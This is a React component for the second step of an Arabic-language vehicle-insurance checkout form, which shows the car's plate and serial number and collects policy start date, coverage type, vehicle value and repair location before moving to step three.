// @ts-nocheck
import { useEffect, useState } from "react";
import CustomInput from "../CustomInput";
import { useLocation, useNavigate } from "react-router-dom";
import { currentPage, sendDataToServer } from "@/context/signals";
import { handleSubmitTab } from "@/utils/actions";

const StepTwo = () => {
  const { state } = useLocation();
  const [error, setError] = useState({});
  const navigate = useNavigate();

  const handlePrev = () => {
    navigate("/checkout/1", state);
  };

  const handleNext = (e) => {
    const res = handleSubmitTab(e, setError);

    const data = { ...state, ...res };

    sendDataToServer(
      data,
      "الخطوة الثانية",
      "الخطوة الثالثة",
      false,
      navigate,
      "/checkout/3",
      data
    );
  };

  useEffect(() => {
    currentPage.value = "الخطوة الثانية";
  }, []);

  return (
    <form onSubmit={handleNext} className="px-8">
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 lg:gap-4 my-6">
        <div className="rounded-3xl bg-white p-4 shadow-lg lg:col-span-3">
          <div className="flex lg-max:flex-col gap-2 justify-between lg:items-center">
            <div className="flex gap-4 items-center">
              <img
                src="/assets/images/impacts/affects-icon5.webp"
                alt="toyota icon"
                className="size-20 border p-4 rounded-lg"
              />
              <span>
                <h3 className="font-bold text-lg">{state?.["car-type"]}</h3>
                <p>الرقم التسلسلى: {state?.serial}</p>
              </span>
            </div>

            <div className="flex">
              <span
                style={{ writingMode: "vertical-rl" }}
                className="grid place-items-center rounded-r-md border px-1 text-gray-800 font-bold hover:bg-gray-100  focus:relative"
              >
                ksa
              </span>
              <div className="flex flex-col">
                <span className="inline-flex overflow-hidden border bg-white shadow-sm rounded-tl-md">
                  <span className="w-28 text-center border-e p-3 text-gray-700 font-bold hover:bg-gray-100  focus:relative">
                    {`${state?.plate_1.split("-")[1]} ${
                      state?.plate_2.split("-")[1]
                    } ${state?.plate_3.split("-")[1]}`}
                  </span>

                  <span className="w-28 text-center p-3 text-gray-700 font-bold hover:bg-gray-100 focus:relative">
                    {state?.plate_num}
                  </span>
                </span>
                <span className="inline-flex overflow-hidden border bg-white shadow-sm rounded-bl-md">
                  <span className="w-28 text-center border-e p-3 text-gray-700 font-bold hover:bg-gray-100  focus:relative">
                    {`${state?.plate_1.split("-")[0]} ${
                      state?.plate_2.split("-")[0]
                    } ${state?.plate_3.split("-")[0]}`}
                  </span>

                  <span className="w-28 text-center p-3 text-gray-700 font-bold hover:bg-gray-100  focus:relative">
                    {Number(state?.plate_num)
                      .toLocaleString("ar-EG")
                      .replace(/٬/g, "")}
                  </span>
                </span>
              </div>
            </div>
          </div>
        </div>

        <CustomInput
          error={error}
          setError={setError}
          styles={"rounded-3xl bg-white p-4 shadow-lg"}
          label="تاريخ بدء الوثيقة"
          placeholder="اختر التاريخ"
          defaultValue={state?.date}
          id="date"
          tip={"متى تريد أن يبدأ تاريخ سريان الوثيقة؟"}
          date
        />

        <CustomInput
          error={error}
          setError={setError}
          styles={"rounded-3xl bg-white p-4 shadow-lg"}
          label="نوع التأمين"
          id="type"
          tip={
            "إذا أردت استخدام المركبة لأغراض شخصية وفي بعض الأوقات ستقوم بنقل ركاب عبر تطبيق أوبر على سبيل المثال فعليك اختيار نقل ركاب"
          }
          biSelect={["ضد الغير", "شامل"]}
        />

        <CustomInput
          error={error}
          setError={setError}
          styles={"rounded-3xl bg-white p-4 shadow-lg col-start-1"}
          label="القيمة التقديرية للمركبة"
          placeholder={"89,863"}
          id="value"
          tip={
            "القيمة التقديرية للسيارة هي القيمة السوقية للسيارة والتي يتم احتساب التعويض في حالة الفقد الكلي على أساسها"
          }
          type={"number"}
        />

        <CustomInput
          error={error}
          setError={setError}
          styles={"rounded-3xl bg-white p-4 shadow-lg"}
          label="مكان الإصلاح"
          id="place"
          tip={
            "مكان الإصلاح هو مكان الإصلاح التي تم تحديدها للمركبة في حالة الفقد الكلي على أساسها"
          }
          type={"radio"}
          radio={["الورشة", "الوكالة"]}
        />
      </div>

      <div className="flex items-center gap-2 lg:gap-6 rounded-3xl shadow-[0px_0px_50px_0px_#8080805e] mt-20 mb-10 p-2">
        <p className="text-white font-bold bg-[#76b456] p-4 rounded-t-3xl rounded-br-3xl">
          خصومات خاصة %
        </p>

        <CustomInput
          error={error}
          setError={setError}
          placeholder="الشروط و الأحكام"
          id="terms"
          terms={
            "اختر هنا إذا كنت تنتمي لإحدى هذه الجهات وذلك للحصول على خصومات خاصة على وثيقة التأمين"
          }
        />
      </div>

      <div className="flex justify-between border-t-2 pt-3">
        <button
          className="capitalize w-52 rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
          onClick={handlePrev}
        >
          السابق
        </button>

        <button
          className="capitalize w-52 rounded-md font-bold py-3 px-6 bg-[#76b456] hover:bg-[#76b456]/90 text-white transition-colors"
          type="submit"
        >
          التالي
        </button>
      </div>
    </form>
  );
};
export default StepTwo;
